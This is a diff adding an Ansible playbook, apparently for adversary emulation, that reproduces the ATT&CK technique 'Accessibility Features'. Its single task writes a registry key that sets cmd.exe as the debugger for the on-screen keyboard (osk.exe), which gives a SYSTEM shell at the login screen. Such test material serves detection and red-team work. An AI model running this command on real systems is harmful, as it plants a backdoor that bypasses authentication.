@@ -1,1 +1,10 @@
-#
+# attack_technique: T015
+- name: T1015 - Accessibility Features
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+          - name: Attaches Command Prompt As Debugger To Process - osk
+            tags: osk
+            command: |
+            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
